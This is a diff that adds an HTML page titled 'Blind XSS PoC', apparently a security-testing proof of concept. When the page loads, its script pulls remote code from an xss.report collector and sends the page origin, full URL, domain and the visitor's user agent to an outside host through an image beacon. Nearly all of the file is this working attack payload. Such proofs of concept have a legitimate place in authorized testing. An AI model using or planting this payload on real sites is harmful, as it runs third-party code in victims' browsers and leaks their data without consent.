@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Blind XSS PoC</title>
+<meta http-equiv="Cache-Control" content="no-store">
+<meta http-equiv="Pragma" content="no-cache">
+</head>
+<body>
+
+<pre id="proof">Executing…</pre>
+
+<script>
+(function () {
+  // proof: DOM mutation (local)
+  document.getElementById('proof').textContent =
+    'Executed on ' + document.domain + ' @ ' + new Date().toISOString();
+
+  // proof: collector notify (xss.report)
+  var s = document.createElement('script');
+  s.src = 'https://xss.report/c/for4k';
+  document.body.appendChild(s);
+
+  // proof: outbound network callback (independent)
+  var q = [
+    'o=' + encodeURIComponent(location.origin),
+    'h=' + encodeURIComponent(location.href),
+    'd=' + encodeURIComponent(document.domain),
+    'u=' + encodeURIComponent(navigator.userAgent),
+    't=' + Date.now()
+  ].join('&');
+  (new Image()).src = 'https://masuk.bxss.in/?' + q;
+})();
+</script>
+
+</body>
+</html>
